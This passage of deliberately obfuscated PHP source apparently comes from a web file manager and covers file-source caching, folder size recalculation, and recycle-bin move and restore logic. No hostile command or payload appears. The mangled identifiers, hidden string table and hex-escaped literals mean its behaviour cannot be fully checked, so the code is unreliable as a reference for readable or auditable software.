= $õø¥‹İ[564] . $Ù‚ó±›³[$õø¥‹İ[557]]; $ª¸¼şàÜ = _get(self::$cacheFileInfo, $¼Šıæ©); if ($ª¸¼şàÜ) { return $ª¸¼şàÜ; } $ÇÇ‰é = Model($õø¥‹İ[560])->fileInfo($Ù‚ó±›³[$õø¥‹İ[557]]); if ($ÇÇ‰é) { $ÇÇ‰é[$õø¥‹İ[32]] = $Ù‚ó±›³[$õø¥‹İ[32]]; } self::$cacheFileInfo[$¼Šıæ©] = $ÇÇ‰é; return $ÇÇ‰é; } private function folderChildrenNumber($ø¹èÒÓû) { $§­ÎĞºĞ =& $_SERVER[ïÃ°£«Ê]; $¨™ø¨§ã = $this->sourceInfo($ø¹èÒÓû); $„€ü—½¾ = array($§­ÎĞºĞ[674] => array($§­ÎĞºĞ[635], $¨™ø¨§ã[$§­ÎĞºĞ[604]] . $ø¹èÒÓû . $§­ÎĞºĞ[636]), $§­ÎĞºĞ[671] => $¨™ø¨§ã[$§­ÎĞºĞ[589]], $§­ÎĞºĞ[519] => intval($¨™ø¨§ã[$§­ÎĞºĞ[520]]), $§­ÎĞºĞ[668] => 1); $”¿Ÿ±…ã = $this->where($„€ü—½¾)->count(); $ÚŸ¹Ù¼³ = $this->where($„€ü—½¾)->where(array($§­ÎĞºĞ[668] => 0))->count(); return array($§­ÎĞºĞ[83] => $ÚŸ¹Ù¼³, $§­ÎĞºĞ[84] => $”¿Ÿ±…ã); } public function pathInfo($œ×¼‹‚À, $±ËÑïŸ = false) { $ÖşÂ‰šá =& $_SERVER[ïÃ°£«Ê]; $±ËÑïŸ = !1; $œ×¼‹‚À = intval($œ×¼‹‚À); if (!$œ×¼‹‚À) { return !1; } $Ï¤ÉÉ¦· = $ÖşÂ‰šá[548] . intval($±ËÑïŸ) . $ÖşÂ‰šá[476] . $œ×¼‹‚À; $óëÇıæ… = _get(self::$cachePathInfo, $Ï¤ÉÉ¦·); if ($óëÇıæ…) { return $óëÇıæ…; } $¸éÏ×Ï = $this->sourceInfo($œ×¼‹‚À); if (!$¸éÏ×Ï) { return !1; } $¸éÏ×Ï = $this->_listDataApplyItem($¸éÏ×Ï, $±ËÑïŸ); self::$cachePathInfo[$Ï¤ÉÉ¦·] = $¸éÏ×Ï; return $¸éÏ×Ï; } public static $cachePathInfoMore = array(); public function pathInfoMore($ší›İì¸) { $ÀèÃÈÓ½ =& $_SERVER[ïÃ°£«Ê]; $ıØ·åù¨ = _get(self::$cachePathInfoMore, $ší›İì¸); if ($ıØ·åù¨) { return $ıØ·åù¨; } $‰»÷¯€Ø = $this->pathInfo($ší›İì¸); if (!$‰»÷¯€Ø) { return !1; } if ($‰»÷¯€Ø[$ÀèÃÈÓ½[500]] == $ÀèÃÈÓ½[91]) { $‰»÷¯€Ø[$ÀèÃÈÓ½[82]] = $this->folderChildrenNumber($ší›İì¸); } self::$cachePathInfoMore[$ší›İì¸] = $‰»÷¯€Ø; return $‰»÷¯€Ø; } public function sourceInfo($ºú‡Ş¸) { $‡¬İö =& $_SERVER[ïÃ°£«Ê]; if (!$ºú‡Ş¸) { return array(); } $ºú‡Ş¸ = intval($ºú‡Ş¸); $ÍŞ‚×Âõ = $‡¬İö[547] . $ºú‡Ş¸; $¤÷Æ®’€ = _get(self::$cacheSourceInfo, $ÍŞ‚×Âõ); if ($¤÷Æ®’€) { return $¤÷Æ®’€; } $Ô½ß÷£¦ = $this->where(array($‡¬İö[191] => $ºú‡Ş¸))->find(); self::$cacheSourceInfo[$ÍŞ‚×Âõ] = $Ô½ß÷£¦; return self::$cacheSourceInfo[$ÍŞ‚×Âõ]; } public function sourceCacheClear($Üëõ‹å = false) { self::cacheClear($Üëõ‹å); } public static function cacheClear($Ë…Š®Ø¬ = false) { $‘¸Úö¤Æ =& $_SERVER[ïÃ°£«Ê]; if ($Ë…Š®Ø¬ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$‘¸Úö¤Æ[547] . $Ë…Š®Ø¬]); unset(self::$cachePathInfoMore[$Ë…Š®Ø¬]); unset(self::$cachePathInfo[$‘¸Úö¤Æ[2500] . $Ë…Š®Ø¬]); unset(self::$cachePathInfo[$‘¸Úö¤Æ[2501] . $Ë…Š®Ø¬]); } public function metaSet($‚ææªŸÒ, $ÅÔíáÓ· = null, $‘Ğ®ûÚ‰ = null) { $Æ­·Ø«¼ = parent::metaSet($‚ææªŸÒ, $ÅÔíáÓ·, $‘Ğ®ûÚ‰); if ($Æ­·Ø«¼) { $this->sourceCacheClear($‚ææªŸÒ); } return $Æ­·Ø«¼; } public function pathInfoByPath($–âÁ¬Òş, $öç¹‘Î•) { $îŸ°½…„ =& $_SERVER[ïÃ°£«Ê]; $é£†ºÒÁ = !$öç¹‘Î• ? array() : explode($îŸ°½…„[8], trim($öç¹‘Î•, $îŸ°½…„[8])); $ô§‰æŸë = intval($–âÁ¬Òş); foreach ($é£†ºÒÁ as $ÖŠŠßáç) { $ƒçğåÜĞ = array($îŸ°½…„[190] => $ô§‰æŸë, $îŸ°½…„[32] => $ÖŠŠßáç); $ãÚ¨‹æ¹ = $this->field($îŸ°½…„[2502])->where($ƒçğåÜĞ)->select(); if (!$ãÚ¨‹æ¹) { return !1; } $ãÚ¨‹æ¹ = array_sort_by($ãÚ¨‹æ¹, $îŸ°½…„[520]); $ô§‰æŸë = intval($ãÚ¨‹æ¹[0][$îŸ°½…„[191]]); } $ïúŞ¿¼ó = $this->sourceInfo($ô§‰æŸë); $this->pathInfoFilter($ïúŞ¿¼ó); return $ïúŞ¿¼ó; } protected function updateModifyTime($ì…–“Õæ) { $™ÒÖŸ·¸ =& $_SERVER[ïÃ°£«Ê]; $îüƒÑÙ× = KodUser::id(); if (!$ì…–“Õæ) { return; } if (!is_array($ì…–“Õæ)) { $ì…–“Õæ = array($ì…–“Õæ); } foreach ($ì…–“Õæ as $¶”Å‹î  => $ùıâ¨çİ) { $ì…–“Õæ[$¶”Å‹î ] = intval($ùıâ¨çİ); $this->sourceCacheClear($ùıâ¨çİ); } $Ì‰˜ÊÀ÷ = array($™ÒÖŸ·¸[191] => array($™ÒÖŸ·¸[7], $ì…–“Õæ)); $ºùÜ‘‰ = array($™ÒÖŸ·¸[673] => $îüƒÑÙ×, $™ÒÖŸ·¸[513] => time()); $this->where($Ì‰˜ÊÀ÷)->save($ºùÜ‘‰); } public function folderSizeReset($ü÷Ó“ë‘, $úÉ¸š©· = false) { $ÅŠ§‹í  =& $_SERVER[ïÃ°£«Ê]; if ($this->statusIgnoreResetSpace) { return; } if (!$ü÷Ó“ë‘) { return; } $Ã½§¿É© = $this->sourceInfo($ü÷Ó“ë‘); $ˆ²Ôø„ä = $ÅŠ§‹í [2503] . $ü÷Ó“ë‘; if (!$Ã½§¿É© || !$Ã½§¿É©[$ÅŠ§‹í [191]]) { return; } CacheLock::lock($ˆ²Ôø„ä, 20); if ($úÉ¸š©· === !1) { $this->sourceCacheClear($ü÷Ó“ë‘); $Ã½§¿É© = $this->sourceInfo($ü÷Ó“ë‘); $ÌïÉÖ‘í = array($ÅŠ§‹í [492] => $ü÷Ó“ë‘, $ÅŠ§‹í [519] => 0); $„Ôñì£ã = $this->where($ÌïÉÖ‘í)->sum($ÅŠ§‹í [79]); $úÉ¸š©· = intval($„Ôñì£ã) - intval($Ã½§¿É©[$ÅŠ§‹í [79]]); } if ($úÉ¸š©· == 0) { return CacheLock::unlock($ˆ²Ôø„ä); } $šà¤‘Âñ = $this->parentLevelArray($Ã½§¿É©[$ÅŠ§‹í [604]]); if (!$šà¤‘Âñ) { $šà¤‘Âñ = array(); } $šà¤‘Âñ[] = $Ã½§¿É©[$ÅŠ§‹í [191]]; $ÌïÉÖ‘í = array($ÅŠ§‹í [191] => array($ÅŠ§‹í [507], $šà¤‘Âñ)); if ($úÉ¸š©· < 0) { $ÌïÉÖ‘í[$ÅŠ§‹í [79]] = array($ÅŠ§‹í [1183], abs($úÉ¸š©·)); } $this->where($ÌïÉÖ‘í)->setAdd($ÅŠ§‹í [79], $úÉ¸š©·); CacheLock::unlock($ˆ²Ôø„ä); if (!$Ã½§¿É©[$ÅŠ§‹í [589]] || $Ã½§¿É©[$ÅŠ§‹í [589]] == $ÅŠ§‹í [228]) { return; } $¬¤ïôÌÚ = $ÅŠ§‹í [2504] . $Ã½§¿É©[$ÅŠ§‹í [188]] . $ÅŠ§‹í [4] . $Ã½§¿É©[$ÅŠ§‹í [589]]; $Õ‹¤Íê¿ = array($Ã½§¿É©[$ÅŠ§‹í [188]], $Ã½§¿É©[$ÅŠ§‹í [589]]); TaskRun::timeLimitCall($¬¤ïôÌÚ, $ÅŠ§‹í [2505], $Õ‹¤Íê¿, 1.5); } public function folderSizeResetChildren($‘ƒ—ÉÏ¦) { $İ’ì¶š® =& $_SERVER[ïÃ°£«Ê]; $this->sourceCacheClear($‘ƒ—ÉÏ¦); $”Îª–ô£ = $this->sourceInfo($‘ƒ—ÉÏ¦); if (!$”Îª–ô£) { return; } $“İ±œ³Ÿ = array($İ’ì¶š®[668] => 1, $İ’ì¶š®[671] => $”Îª–ô£[$İ’ì¶š®[589]], $İ’ì¶š®[674] => array($İ’ì¶š®[635], $”Îª–ô£[$İ’ì¶š®[604]] . $‘ƒ—ÉÏ¦ . $İ’ì¶š®[636])); $óú¢©‡ = $İ’ì¶š®[2506]; $¿³€–ŠÖ = $this->field($óú¢©‡)->where($“İ±œ³Ÿ)->select(); $“İ±œ³Ÿ[$İ’ì¶š®[500]] = 0; $û»êîÊ = $this->field($óú¢©‡)->where($“İ±œ³Ÿ)->select(); if (!$û»êîÊ) { return; } $¿³€–ŠÖ[] = $”Îª–ô£; $¿³€–ŠÖ = array_to_keyvalue($¿³€–ŠÖ, $İ’ì¶š®[191]); foreach ($¿³€–ŠÖ as $¾ä²±” => $§’Ù®ÕÂ) { $¿³€–ŠÖ[$¾ä²±”][$İ’ì¶š®[2507]] = $¿³€–ŠÖ[$¾ä²±”][$İ’ì¶š®[79]]; $¿³€–ŠÖ[$¾ä²±”][$İ’ì¶š®[79]] = 0; } foreach ($û»êîÊ as $§’Ù®ÕÂ) { $ƒ¡èñÕ = $§’Ù®ÕÂ[$İ’ì¶š®[190]] . $İ’ì¶š®[12]; if (!isset($¿³€–ŠÖ[$ƒ¡èñÕ])) { continue; } if ($§’Ù®ÕÂ[$İ’ì¶š®[520]] == $¿³€–ŠÖ[$ƒ¡èñÕ][$İ’ì¶š®[520]]) { $¿³€–ŠÖ[$ƒ¡èñÕ][$İ’ì¶š®[79]] += $§’Ù®ÕÂ[$İ’ì¶š®[79]]; } } foreach ($¿³€–ŠÖ as $§’Ù®ÕÂ) { $µ½ÖÇß = $this->parentLevelArray($§’Ù®ÕÂ[$İ’ì¶š®[604]]); foreach ($µ½ÖÇß as $ƒ¡èñÕ) { $ƒ¡èñÕ = $ƒ¡èñÕ . $İ’ì¶š®[12]; if (!isset($¿³€–ŠÖ[$ƒ¡èñÕ])) { continue; } if ($§’Ù®ÕÂ[$İ’ì¶š®[520]] == $¿³€–ŠÖ[$ƒ¡èñÕ][$İ’ì¶š®[520]]) { $¿³€–ŠÖ[$ƒ¡èñÕ][$İ’ì¶š®[79]] += $§’Ù®ÕÂ[$İ’ì¶š®[79]]; } } } $„¿Ğ´Çı = array(); foreach ($¿³€–ŠÖ as $§’Ù®ÕÂ) { if ($§’Ù®ÕÂ[$İ’ì¶š®[79]] == $§’Ù®ÕÂ[$İ’ì¶š®[2507]]) { continue; } $„¿Ğ´Çı[] = array($İ’ì¶š®[191], $§’Ù®ÕÂ[$İ’ì¶š®[191]], $İ’ì¶š®[79], $§’Ù®ÕÂ[$İ’ì¶š®[79]]); } $this->saveAll($„¿Ğ´Çı); } public function userSpaceReset($‹‚ÁìÅİ = false) { $´•¤Š¶ü =& $_SERVER[ïÃ°£«Ê]; $½ƒ¸¬“‰ = $this->where(array($´•¤Š¶ü[188] => self::TYPE_USER, $´•¤Š¶ü[589] => $‹‚ÁìÅİ, $´•¤Š¶ü[500] => 0))->sum($´•¤Š¶ü[79]); $½ƒ¸¬“‰ = !$½ƒ¸¬“‰ || $½ƒ¸¬“‰ <= 0 ? 0 : $½ƒ¸¬“‰; Model($´•¤Š¶ü[597])->userEdit($‹‚ÁìÅİ, array($´•¤Š¶ü[2173] => $½ƒ¸¬“‰)); } public function targetSpaceUpdate($´˜ƒÓÇÄ, $ËùÀ¢åÅ) { $Æ…”øò… =& $_SERVER[ïÃ°£«Ê]; if (!$ËùÀ¢åÅ) { return; } if (!in_array($´˜ƒÓÇÄ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ºˆÉ”Ûö = $this->targetSpaceSize($´˜ƒÓÇÄ, $ËùÀ¢åÅ); if ($´˜ƒÓÇÄ == self::TYPE_USER) { Model($Æ…”øò…[597])->userEdit($ËùÀ¢åÅ, array($Æ…”øò…[2173] => $ºˆÉ”Ûö)); } else { if ($´˜ƒÓÇÄ == self::TYPE_GROUP) { Model($Æ…”øò…[605])->groupEdit($ËùÀ¢åÅ, array($Æ…”øò…[2173] => $ºˆÉ”Ûö)); } } } public function targetSpaceSize($ˆóĞëÑì, $È¶úğ‚) { $³›ıÒ§ =& $_SERVER[ïÃ°£«Ê]; $ë—¨®Û§ = 0; $–¦ë§Ä = $this->targetSourceRoot($ˆóĞëÑì, $È¶úğ‚, !0); foreach ($–¦ë§Ä as $”Ğ’§´) { if (!$”Ğ’§´) { continue; } $ë—¨®Û§ += floatval($”Ğ’§´[$³›ıÒ§[79]]); $ôÕšË³ó = array($³›ıÒ§[674] => array($³›ıÒ§[635], $³›ıÒ§[613] . $”Ğ’§´[$³›ıÒ§[191]] . $³›ıÒ§[636])); $ò¥‹Ğğ = Model($³›ıÒ§[518])->field($³›ıÒ§[506])->where($ôÕšË³ó)->select(); $ò¥‹Ğğ = array_to_keyvalue($ò¥‹Ğğ, $³›ıÒ§[12], $³›ıÒ§[191]); $ò¥‹Ğğ = array_unique(array_filter($ò¥‹Ğğ)); if ($ò¥‹Ğğ) { $ôÕšË³ó = array($³›ıÒ§[506] => array($³›ıÒ§[507], $ò¥‹Ğğ)); $ë—¨®Û§ += floatval($this->where($ôÕšË³ó)->sum($³›ıÒ§[79])); } } $ë—¨®Û§ = !$ë—¨®Û§ || $ë—¨®Û§ <= 0 ? 0 : $ë—¨®Û§; return $ë—¨®Û§; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¤Ä  ) { return $this->fileTypeProfile($¤Ä  , SourceModel::TYPE_USER); } public function groupFileTypeProfile($ÚÍ”Ìº) { return $this->fileTypeProfile($ÚÍ”Ìº, SourceModel::TYPE_GROUP); } private function fileTypeProfile($•×ƒÌ©à, $ŠãÈ‡Êı) { $Â„ä·–× =& $_SERVER[ïÃ°£«Ê]; $Ÿ„’éñ = $Â„ä·–×[2508] . $•×ƒÌ©à . $Â„ä·–×[11] . $ŠãÈ‡Êı; $×«âì± = Cache::get($Ÿ„’éñ); if ($×«âì±) { return $×«âì±; } $ËÊåœä = array($Â„ä·–×[668] => 0); if ($•×ƒÌ©à != !1) { $ËÊåœä[$Â„ä·–×[589]] = $•×ƒÌ©à; $ËÊåœä[$Â„ä·–×[188]] = $ŠãÈ‡Êı; } $­ä—¦›† = array(); $àÊøŸÅœ = $this->field(array($Â„ä·–×[950] => $Â„ä·–×[951], $Â„ä·–×[952] => $Â„ä·–×[79]))->where($ËÊåœä)->find(); $­ä—¦›†[$Â„ä·–×[2509]] = array($Â„ä·–×[2510] => LNG($Â„ä·–×[2509]), $Â„ä·–×[2511] => intval($àÊøŸÅœ[$Â„ä·–×[951]]), $Â„ä·–×[640] => intval($àÊøŸÅœ[$Â„ä·–×[79]])); $‘†Î½ ˆ = KodIO::fileTypeList(); foreach ($‘†Î½ ˆ as $±Ü¥ã£ => $ÕÀØ†°) { $ËÊåœä[$Â„ä·–×[501]] = $this->fileTypeWhere($±Ü¥ã£); $àÊøŸÅœ = $this->field(array($Â„ä·–×[950] => $Â„ä·–×[951], $Â„ä·–×[952] => $Â„ä·–×[79]))->where($ËÊåœä)->find(); $­ä—¦›†[$±Ü¥ã£] = array($Â„ä·–×[2510] => $ÕÀØ†°[$Â„ä·–×[32]], $Â„ä·–×[2511] => intval($àÊøŸÅœ[$Â„ä·–×[951]]), $Â„ä·–×[640] => intval($àÊøŸÅœ[$Â„ä·–×[79]])); } Cache::set($Ÿ„’éñ, $­ä—¦›†, 1200); return $­ä—¦›†; } public function fileNameExist($¹–Ÿ£, $÷ËŸ…–´) { $¼Ş¯èãÌ =& $_SERVER[ïÃ°£«Ê]; $Õµäƒşù = $this->field($¼Ş¯èãÌ[2512])->where(array($¼Ş¯èãÌ[190] => $¹–Ÿ£, $¼Ş¯èãÌ[32] => $÷ËŸ…–´, $¼Ş¯èãÌ[520] => 0))->find(); return is_array($Õµäƒşù) ? $Õµäƒşù[$¼Ş¯èãÌ[191]] : !1; } public function childList($ÖÂˆ­·¹) { $‘ŞÇŸ =& $_SERVER[ïÃ°£«Ê]; $Ø¶á„ê = $‘ŞÇŸ[2485] . $ÖÂˆ­·¹; if (isset(self::$cacheChildList[$Ø¶á„ê])) { return self::$cacheChildList[$Ø¶á„ê]; } $‚ˆò‰Ğä = array($‘ŞÇŸ[190] => intval($ÖÂˆ­·¹), $‘ŞÇŸ[520] => 0); $ûÕ¼ÒºÀ = $this->where($‚ˆò‰Ğä)->select(); $ûÕ¼ÒºÀ = $ûÕ¼ÒºÀ ? $ûÕ¼ÒºÀ : array(); self::$cacheChildList[$Ø¶á„ê] = $ûÕ¼ÒºÀ; foreach ($ûÕ¼ÒºÀ as $ñ«ë¶»Ö) { $Ø¶á„ê = $‘ŞÇŸ[547] . $ñ«ë¶»Ö[$‘ŞÇŸ[191]]; self::$cacheSourceInfo[$Ø¶á„ê] = $ñ«ë¶»Ö; } return $ûÕ¼ÒºÀ; } public function fileNameAuto($„ìÍşÁ, $µŒöšëÃ, $·«Äß×Î = REPEAT_RENAME, $äéå§„‡ = false) { $‡ªËâì =& $_SERVER[ïÃ°£«Ê]; $÷ÖãÚ„ü = get_path_ext($µŒöšëÃ); $ˆò¦Ğ€å = $÷ÖãÚ„ü ? get_path_ext_name($µŒöšëÃ) . $‡ªËâì[2513] . $÷ÖãÚ„ü : $µŒöšëÃ . $‡ªËâì[474]; $ÀÓáÄ†ß = array($‡ªËâì[190] => $„ìÍşÁ, $‡ªËâì[520] => 0, $‡ªËâì[32] => array($‡ªËâì[473], $ˆò¦Ğ€å)); $ˆ¡¥×¢• = $this->field($‡ªËâì[32])->where($ÀÓáÄ†ß)->select(); $…Ñ€¯ˆ‘ = array_to_keyvalue($ˆ¡¥×¢•, $‡ªËâì[12], $‡ªËâì[32]); return $this->fileNameAutoGet($…Ñ€¯ˆ‘, $µŒöšëÃ, $·«Äß×Î, $äéå§„‡); } public function fileNameAutoGet($­»àŞ€á, $ŞöçË¦, $ë«‚®ìí, $§â´À‹) { $µœ®ã¡ï =& $_SERVER[ïÃ°£«Ê]; if ($ë«‚®ìí == REPEAT_REPLACE || !$­»àŞ€á || !in_array_not_case($ŞöçË¦, $­»àŞ€á) || $§â´À‹ && $ë«‚®ìí != REPEAT_RENAME_FOLDER) { return $ŞöçË¦; } if ($ë«‚®ìí == REPEAT_SKIP) { return !1; } $Õ¸Ğ­ø¦ = $µœ®ã¡ï[10] . get_path_ext($ŞöçË¦); $Õ¸Ğ­ø¦ = $Õ¸Ğ­ø¦ == $µœ®ã¡ï[10] || $§â´À‹ ? $µœ®ã¡ï[12] : $Õ¸Ğ­ø¦; for ($Ñ•®º§Œ = 1; $Ñ•®º§Œ <= count($­»àŞ€á) + 1; $Ñ•®º§Œ++) { $¶ï¥²³É = substr($ŞöçË¦, 0, strlen($ŞöçË¦) - strlen($Õ¸Ğ­ø¦)); $ô…¿î¢½ = $¶ï¥²³É . "\x28{$Ñ•®º§Œ}\x29{$Õ¸Ğ­ø¦}"; if (!in_array_not_case($ô…¿î¢½, $­»àŞ€á)) { return $ô…¿î¢½; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\x72\x63\145\x5f\x72\145\x63\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\151\155\145", "\x74\151\x6d\x65", "\151\156\163\x65\162\164", "\146\x75\x6e\x63\x74\151\x6f\x6e")); public function listData($¾™Ü¡° = false) { $üõÑì› =& $_SERVER[ïÃ°£«Ê]; $¾™Ü¡° = $¾™Ü¡° ? $¾™Ü¡° : USER_ID; $›«§Û³ñ = $this->where(array($üõÑì›[1971] => $¾™Ü¡°))->select(); return array_to_keyvalue($›«§Û³ñ, $üõÑì›[12], $üõÑì›[191]); } public function moveToRecycle($ĞÍ¡®îš) { $–¢²—õ =& $_SERVER[ïÃ°£«Ê]; $Ÿ§ƒïËÉ = Model($–¢²—õ[1535]); $ŠÚ÷®ª› = $Ÿ§ƒïËÉ->sourceInfo($ĞÍ¡®îš); if (!$ŠÚ÷®ª› || $ŠÚ÷®ª›[$–¢²—õ[520]] == $–¢²—õ[91]) { return; } $Á·İ·°… = array($–¢²—õ[506] => $ĞÍ¡®îš, $–¢²—õ[1971] => USER_ID, $–¢²—õ[670] => $ŠÚ÷®ª›[$–¢²—õ[188]], $–¢²—õ[671] => $ŠÚ÷®ª›[$–¢²—õ[589]], $–¢²—õ[674] => $ŠÚ÷®ª›[$–¢²—õ[604]]); $this->add($Á·İ·°…); $this->recycleMove($ĞÍ¡®îš, 1); if ($ŠÚ÷®ª›[$–¢²—õ[500]] == $–¢²—õ[91]) { $Â•Û–¿ = array($–¢²—õ[674] => array($–¢²—õ[635], $ŠÚ÷®ª›[$–¢²—õ[604]] . $ĞÍ¡®îš . $–¢²—õ[636])); $Ÿ§ƒïËÉ->where($Â•Û–¿)->setField($–¢²—õ[520], 1); } } public function clear() { $this->remove(!1); } public function remove($ˆå‚ÎĞ÷ = false, $éÜŠ‰¶‚ = false) { $¨¨ş¾£÷ =& $_SERVER[ïÃ°£«Ê]; $éÜŠ‰¶‚ = $éÜŠ‰¶‚ ? $éÜŠ‰¶‚ : USER_ID; $¯©£±ß‚ = Model($¨¨ş¾£÷[1535]); $ƒ˜ê¨µÙ = $this->listData($éÜŠ‰¶‚); $ˆå‚ÎĞ÷ = $ˆå‚ÎĞ÷ === !1 ? !1 : $ˆå‚ÎĞ÷; $¤ø…Ïíó = array(); foreach ($ƒ˜ê¨µÙ as $Äº‰ã–) { if ($ˆå‚ÎĞ÷ != !1 && !in_array($Äº‰ã–, $ˆå‚ÎĞ÷)) { continue; } $ØÂ¸–¸¦ = $¯©£±ß‚->sourceInfo($Äº‰ã–); $¯©£±ß‚->remove($Äº‰ã–, !1); $¶ÖÑ×§´ = $ØÂ¸–¸¦[$¨¨ş¾£÷[188]] . $¨¨ş¾£÷[11] . $ØÂ¸–¸¦[$¨¨ş¾£÷[589]]; $¤ø…Ïíó[$¶ÖÑ×§´] = array($¨¨ş¾£÷[670] => $ØÂ¸–¸¦[$¨¨ş¾£÷[188]], $¨¨ş¾£÷[589] => $ØÂ¸–¸¦[$¨¨ş¾£÷[589]]); $this->where(array($¨¨ş¾£÷[191] => $Äº‰ã–))->delete(); } foreach ($¤ø…Ïíó as $ İö§Ã‡) { $¯©£±ß‚->targetSpaceUpdate($ İö§Ã‡[$¨¨ş¾£÷[188]], $ İö§Ã‡[$¨¨ş¾£÷[589]]); } } public function restore($ĞÂÈ€Äç = false) { $¶à—·Ğ = $this->listData(); $this->_restoreSource($¶à—·Ğ, $ĞÂÈ€Äç); } public function removeUserAll($‰ìœÈŒç) { $this->remove(!1, $‰ìœÈŒç); } public function restoreItem($˜ç´ŒêÀ) { $this->_restoreSource(array($˜ç´ŒêÀ), array($˜ç´ŒêÀ)); } private function _restoreSource($‚€ü«âÓ, $²¡„”Ïû) { $ôâ¤òØ¾ =& $_SERVER[ïÃ°£«Ê]; $üÛäúˆ‹ = Model($ôâ¤òØ¾[1535]); $²¡„”Ïû = $²¡„”Ïû == !1 ? !1 : $²¡„”Ïû; if (!$‚€ü«âÓ) { return !0; } $œ„ñª¸ = array(); foreach ($‚€ü«âÓ as $ÑñÍ²Å) { if ($²¡„”Ïû != !1 && !in_array($ÑñÍ²Å, $²¡„”Ïû)) { continue; } $Üü¬ôÂä = $üÛäúˆ‹->sourceInfo($ÑñÍ²Å); $Û˜Ü…Ø· = $üÛäúˆ‹->sourceInfo($Üü¬ôÂä[$ôâ¤òØ¾[190]]); if ($Û˜Ü…Ø·[$ôâ¤òØ¾[520]] == $ôâ¤òØ¾[91]) { continue; } $üÛäúˆ‹->lockMoveStart($ÑñÍ²Å); $this->recycleMove($ÑñÍ²Å, 0); if ($Üü¬ôÂä[$ôâ¤òØ¾[500]] == $ôâ¤òØ¾[91]) { $åÒíÏ¥ = array($ôâ¤òØ¾[674] => array($ôâ¤òØ¾[635], $Üü¬ôÂä[$ôâ¤òØ¾[604]] . $ÑñÍ²Å . $ôâ¤òØ¾[636])); $üÛäúˆ‹->where($åÒíÏ¥)->setField($ôâ¤òØ¾[520], 0); $this->restoreFolderChildren($ÑñÍ²Å, $‚€ü«âÓ); } $this->where(array($ôâ¤òØ¾[191] => $ÑñÍ²Å))->delete(); $üÛäúˆ‹->folderSizeReset($Üü¬ôÂä[$ôâ¤òØ¾[190]]); $œ„ñª¸[] = $Üü¬ôÂä[$ôâ¤òØ¾[190]]; if ($Üü¬ôÂä[$ôâ¤òØ¾[500]] == $ôâ¤òØ¾[91]) { $œ„ñª¸[] = $ÑñÍ²Å; } $üÛäúˆ‹->lockMoveEnd($ÑñÍ²Å); } $üÛäúˆ‹->updateModifyTime($œ„ñª¸); } private function restoreFolderChildren($´¾ì¾, $ëùÃª¾¹) { $·ÌÇ•˜ì =& $_SERVER[ïÃ°£«Ê]; $ÎÛªıŞé = Model($·ÌÇ•˜ì[1535]); $Í×÷è¦ = array($·ÌÇ•˜ì[191] => array($·ÌÇ•˜ì[7], array())); foreach ($ëùÃª¾¹ as $«ÅãŞÂé) { if ($«ÅãŞÂé == $´¾ì¾) { continue; } if (!$ÎÛªıŞé->isParentOf($´¾ì¾, $«ÅãŞÂé)) { continue; } $×º½ªøÁ = $ÎÛªıŞé->sourceInfo($«ÅãŞÂé); if ($×º½ªøÁ[$·ÌÇ•˜ì[500]] == $·ÌÇ•˜ì[91]) { $Í×÷è¦[] = array($·ÌÇ•˜ì[674] => array($·ÌÇ•˜ì[635], $×º½ªøÁ[$·ÌÇ•˜ì[604]] . $«ÅãŞÂé . $·ÌÇ•˜ì[636])); } else { $Í×÷è¦[$·ÌÇ•˜ì[191]][1][] = $«ÅãŞÂé; } } if (!$Í×÷è¦[$·ÌÇ•˜ì[191]][1]) { unset($Í×÷è¦[$·ÌÇ•˜ì[191]]); } if (!$Í×÷è¦) { return; } if (is_array($Í×÷è¦[$·ÌÇ•˜ì[191]]) && is_array($Í×÷è¦[$·ÌÇ•˜ì[191]][1])) { $Í×÷è¦[$·ÌÇ•˜ì[191]][1] = array_unique($Í×÷è¦[$·ÌÇ•˜ì[191]][1]); } $Í×÷è¦[$·ÌÇ•˜ì[1168]] = $·ÌÇ•˜ì[2287]; $ÎÛªıŞé->where($Í×÷è¦)->setField($·ÌÇ•˜ì[520], 1); } private function recycleMove($¯›ÑšÔ, $­„·ğº‹ = 1) { $ÀûÖ¤»½ =& $_SERVER[ïÃ°£«Ê]; $Æ¼¹òß = Model($ÀûÖ¤»½[1535]); $ÇÔ®«¸ = Model($ÀûÖ¤»½[2514]); $âÃåß¼ = array($ÀûÖ¤»½[191] => $¯›ÑšÔ); if ($­„·ğº‹) { $Æ¼¹òß->where($âÃåß¼)->setField($ÀûÖ¤»½[520], 1); $ÇÔ®«¸->eventRecycle($¯›ÑšÔ, $ÀûÖ¤»½[2515]); } else { $ò­ÊÃå· = $Æ¼¹òß->where($âÃåß¼)->find(); $×‰öĞá = $ò­ÊÃå·[$ÀûÖ¤»½[500]] == $ÀûÖ¤»½[91]; $Ÿ»Õ ™ = $Æ¼¹òß->fileNameAuto($ò­ÊÃå·[$ÀûÖ¤»½[190]], $ò­ÊÃå·[$ÀûÖ¤»½[32]], REPEAT_RENAME_FOLDER, $×‰öĞá); if ($Ÿ»Õ ™ != $ò­ÊÃå·[$ÀûÖ¤»½[32]]) { $Æ¼¹òß->rename($¯›ÑšÔ, $Ÿ»Õ ™); } $Æ¼¹òß->where($âÃåß¼)->setField($ÀûÖ¤»½[520], 0); $ÇÔ®«¸->eventRecycle($¯›ÑšÔ, $ÀûÖ¤»½[969]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\163\157\x75\x72\x63\145\x53\145\143\x72\x65\164\x4c\151\x73\164"; public $field = array("\x73\x6f\x75\162\143\x65\x49\104", "\164\171\x70\x65\x49\x44", "\143\162\x65\141\x74\145\125\163\145\x72"); } goto Eòô‘½­À“; Eñ±¾ –ƒ÷: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\145\x5f\x63\x6f\156\x74\145\x6e\x74\x73"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\x73\145\162\x74", "\146\165\x6e\x63\x74\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\154\145"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\155\x65" => 